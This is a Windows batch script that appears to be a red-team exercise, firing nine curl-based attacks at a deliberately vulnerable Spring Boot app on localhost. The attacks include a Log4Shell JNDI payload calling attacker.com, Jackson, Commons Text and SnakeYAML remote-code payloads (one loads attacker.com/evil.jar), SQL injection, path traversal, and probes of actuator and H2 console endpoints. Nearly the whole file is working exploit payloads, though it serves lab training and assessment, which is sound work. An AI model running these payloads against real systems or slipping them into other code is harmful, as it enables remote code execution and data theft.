@echo off
REM Red Team Attack Scripts for Vulnerable Spring Boot App (Windows)

set APP_URL=http://localhost:8080

echo 🔴 RED TEAM: Starting security assessment of vulnerable application...
echo Target: %APP_URL%
echo ==================================================

REM Test 1: Log4Shell Attack
echo 🎯 Test 1: Log4Shell Vulnerability (CVE-2021-44228)
curl -X POST "%APP_URL%/api/log" -H "Content-Type: application/json" -d "{\"message\": \"${jndi:ldap://attacker.com/evil}\"}"
echo.

REM Test 2: Unsafe Deserialization
echo 🎯 Test 2: Unsafe Deserialization (CVE-2020-36518)
curl -X POST "%APP_URL%/api/deserialize" -H "Content-Type: application/json" -d "[\"java.util.HashMap\",{\"@class\":\"java.lang.Runtime\",\"@method\":\"exec\",\"command\":\"calc\"}]"
echo.

REM Test 3: SQL Injection
echo 🎯 Test 3: SQL Injection
curl "%APP_URL%/api/user/1%%20OR%%201=1--"
echo.

REM Test 4: Command Injection via Commons Text
echo 🎯 Test 4: Script Injection (CVE-2022-42889)
curl -X POST "%APP_URL%/api/template" -H "Content-Type: application/json" -d "{\"template\": \"${script:javascript:java.lang.Runtime.getRuntime().exec(\\\"calc\\\")}\"}"
echo.

REM Test 5: YAML Deserialization
echo 🎯 Test 5: YAML Deserialization (CVE-2022-1471)
curl -X POST "%APP_URL%/api/yaml" -H "Content-Type: application/json" -d "some_key: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker.com/evil.jar\"]]]]"
echo.

REM Test 6: Information Disclosure
echo 🎯 Test 6: Information Disclosure
curl "%APP_URL%/api/debug"
echo.

REM Test 7: Path Traversal
echo 🎯 Test 7: Path Traversal
curl "%APP_URL%/api/file?filename=../../../windows/system32/drivers/etc/hosts"
echo.

REM Test 8: Exposed Actuator Endpoints
echo 🎯 Test 8: Exposed Management Endpoints
curl "%APP_URL%/actuator"
curl "%APP_URL%/actuator/env"
curl "%APP_URL%/actuator/configprops"
echo.

REM Test 9: H2 Console Access
echo 🎯 Test 9: H2 Database Console Access
curl "%APP_URL%/h2-console"
echo.

echo ==================================================
echo 🔴 RED TEAM: Security assessment completed!
echo 📊 Generate vulnerability report with:
echo    mvn dependency-check:check -f vulnerable-app/pom.xml
pause
